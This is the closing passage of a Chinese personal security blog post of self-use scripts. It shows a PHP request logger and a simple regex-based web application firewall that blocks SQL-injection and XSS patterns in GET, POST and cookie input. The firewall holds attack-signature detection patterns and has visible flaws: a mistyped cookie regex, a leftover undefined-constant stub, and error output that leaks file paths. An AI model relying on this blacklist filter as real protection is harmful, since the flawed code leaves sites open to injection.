<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$LOG_FILENAME</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\r\n"</span><span class="token operator">.</span><span class="token variable">$time</span><span class="token operator">.</span><span class="token string double-quoted-string">"\r\n"</span><span class="token operator">.</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 写入日志文件</span>

<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$LOG_FILENAME</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\r\n"</span><span class="token operator">.</span><span class="token string single-quoted-string">'http://'</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 写入日志文件</span>

<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$LOG_FILENAME</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\r\n***************************************************************"</span><span class="token punctuation">,</span><span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 写入日志文件</span>
<span class="token punctuation">&#125;</span>

<span class="token function">waf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h5 id="waf"><a class="anchor" href="#waf">#</a> waf</h5><p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">&lt;!-- 
require_once('waf.php')

PHPCMS V9 \phpcms\base.php
PHPWIND8.7 \data\sql_config.php
DEDECMS5.7 \data\common.inc.php
DiscuzX2   \config\config_global.php
Wordpress   \wp-config.php
Metinfo   \include\head.php
--></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">function</span> <span class="token function-definition function">customError</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;b>Error number:&lt;/b> [<span class="token interpolation"><span class="token variable">$errno</span></span>],error on line <span class="token interpolation"><span class="token variable">$errline</span></span> in <span class="token interpolation"><span class="token variable">$errfile</span></span>&lt;br />"</span><span class="token punctuation">;</span>
	<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"customError"</span><span class="token punctuation">,</span> <span class="token constant">E_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$getfilter</span><span class="token operator">=</span><span class="token string double-quoted-string">"'|(and|or)\\b.+?(>|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span><span class="token punctuation">;</span>
<span class="token variable">$postfilter</span><span class="token operator">=</span><span class="token string double-quoted-string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|>|&lt;|\\bin\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span><span class="token punctuation">;</span>
<span class="token variable">$cookiefilter</span><span class="token operator">=</span><span class="token string double-quoted-string">"\\b(and|or)\\b.&#123;1.6&#125;?(=|>|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">DefendAttack</span><span class="token punctuation">(</span><span class="token variable">$StrFiltKey</span><span class="token punctuation">,</span> <span class="token variable">$StrFiltValue</span><span class="token punctuation">,</span> <span class="token variable">$ArrFiltReq</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$StrFiltValue</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$StrFiltValue</span> <span class="token operator">=</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token variable">$StrFiltValue</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$ArrFiltReq</span><span class="token operator">.</span><span class="token string double-quoted-string">"/is"</span><span class="token punctuation">,</span> <span class="token variable">$StrFiltValue</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token comment">//slog ("&lt;br>&lt;br > 操作 IP:".$_SERVER ["REMOTE_ADDR"]."&lt;br > 操作时间:".strftime ("% Y-% m-% d % H:% M:% S")."&lt;br > 操作页面:".$_SERVER ["PHP_SELF"]."&lt;br > 提交方式:".$_SERVER ["REQUEST_METHOD"]."&lt;br > 提交参数:".$StrFiltKey."&lt;br > 提交参数:".$StrFiltValue);</span>
		<span class="token keyword">print</span> <span class="token string double-quoted-string">"360WebSec notice: Illegal operation!"</span><span class="token punctuation">;</span>
		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//$ArrPGC = array_merge($_GET, $_POST, $_COOKIE);</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">DefendAttack</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$getfilter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">DefendAttack</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$postfilter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">DefendAttack</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$cookiefilter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token comment"># code...</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">slog</span><span class="token punctuation">(</span><span class="token variable">$logs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token variable">$toppath</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"DOCUMENT_ROOT"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"/log.htm"</span><span class="token punctuation">;</span>
	<span class="token variable">$Ts</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$toppath</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$Ts</span><span class="token punctuation">,</span> <span class="token variable">$logs</span><span class="token operator">.</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$Ts</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104122132974.png" alt="image-20221104122132974"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104123425661.png" alt="image-20221104123425661"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104125407895.png" alt="image-20221104125407895"></p><div class="tags"><a href="/tags/%E6%9D%82%E8%AE%B0/" rel="tag"><i class="ic i-tag"></i> 杂记</a></div></div><footer><div class="meta"></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Clown <i class="ic i-at"><em>@</em></i></li><li class="link"><strong>本文链接：</strong> <a href="https://blog.xcu.icu/2022/10/24/%E8%87%AA%E7%94%A8%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E8%84%9A%E6%9C%AC%E8%AE%B0%E5%BD%95/" title="自用一些简单脚本记录">https://blog.xcu.icu/2022/10/24/自用一些简单脚本记录/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2022/09/23/%E5%9F%BA%E4%BA%8Esql-labs%E9%9D%B6%E5%9C%BA%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E8%BF%9B%E9%98%B6%E7%AF%87/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeybxm1pj20zk0m8niv.jpg" title="基于sqli-labs进阶学习"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> Web</span><h3>基于sqli-labs进阶学习</h3></a></div><div class="item right"><a href="/2022/10/24/%E9%93%BE%E8%A1%A8/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giph47e9vtj20zk0m8x6l.jpg" title="顺序表"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 数据结构</span><h3>顺序表</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4%E6%A0%BC%E5%BC%8F%E8%BD%AC%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">php 伪随机数爆破格式转化</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">sql 注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%A5%97%E5%A8%83"><span class="toc-number">3.</span> <span class="toc-text">压缩包套娃</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%83%A8%E5%88%86%E7%88%86%E5%85%A8%E5%86%85%E5%AE%B9hash"><span class="toc-number">4.</span> <span class="toc-text">部分爆全内容 hash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#base%E9%9A%90%E5%86%99%E5%8A%A0%E5%AF%86"><span class="toc-number">5.</span> <span class="toc-text">base 隐写加密</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#base%E9%9A%90%E5%86%99%E8%A7%A3%E5%AF%86"><span class="toc-number">6.</span> <span class="toc-text">base 隐写解密</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php%E6%8E%A2%E9%92%88"><span class="toc-number">7.</span> <span class="toc-text">php 探针</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%91%E6%8E%A7"><span class="toc-number">8.</span> <span class="toc-text">监控</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#waf"><span class="toc-number">9.</span> <span class="toc-text">waf</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li class="active"><a href="/2022/10/24/%E8%87%AA%E7%94%A8%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E8%84%9A%E6%9C%AC%E8%AE%B0%E5%BD%95/" rel="bookmark" title="自用一些简单脚本记录">自用一些简单脚本记录</a></li><li><a href="/2022/10/25/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" rel="bookmark" title="hexo+github搭建个人博客">hexo+github搭建个人博客</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Clown" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Clown</p><div class="description" itemprop="description">一个妄想全栈web小废物的博客</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">27</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">10</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">23</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nsb3duLXE=" title="https:&#x2F;&#x2F;github.com&#x2F;clown-q"><i class="ic i-github"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2022/09/23/%E5%9F%BA%E4%BA%8Esql-labs%E9%9D%B6%E5%9C%BA%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E8%BF%9B%E9%98%B6%E7%AF%87/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2022/10/24/%E9%93%BE%E8%A1%A8/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%BA%94%E7%94%A8/" title="分类于 网络服务应用">网络服务应用</a></div><span><a href="/2022/11/19/chanzhi%E6%90%AD%E5%BB%BA/" title="WWW服务器搭建CMS">WWW服务器搭建CMS</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%86%85%E7%BD%91/" title="分类于 内网">内网</a></div><span><a href="/2022/10/24/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E6%90%AD%E5%BB%BA/" title="域环境基础和搭建">域环境基础和搭建</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/10/29/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" title="XSS跨站脚本攻击">XSS跨站脚本攻击</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTFshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2022/11/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="CTFshow-web入门文件包含">CTFshow-web入门文件包含</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="分类于 渗透测试">渗透测试</a></div><span><a href="/2022/11/04/VulnHub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Billu_b0x%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/" title="VulnHub靶机学习">VulnHub靶机学习</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%9D%82%E8%AE%B0/" title="分类于 杂记">杂记</a></div><span><a href="/2022/10/24/%E8%87%AA%E7%94%A8%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E8%84%9A%E6%9C%AC%E8%AE%B0%E5%BD%95/" title="自用一些简单脚本记录">自用一些简单脚本记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/11/05/phpfilter%E7%9A%84%E7%BB%95exit/" title="php:&#x2F;&#x2F;filter过exit">php://filter过exit</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%BA%94%E7%94%A8/" title="分类于 网络服务应用">网络服务应用</a></div><span><a href="/2022/10/24/nat%E6%A8%A1%E5%BC%8Fip%E5%88%86%E9%85%8D/" title="nat模式+ip分配">nat模式+ip分配</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Linux/" title="分类于 Linux">Linux</a></div><span><a href="/2022/10/24/samba%E5%85%B1%E4%BA%AB/" title="Samba共享">Samba共享</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/10/24/sql%E6%B3%A8%E5%85%A5/" title="SQL注入">SQL注入</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2022</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Clown @ ClownのBlog</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2022/10/24/自用一些简单脚本记录/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->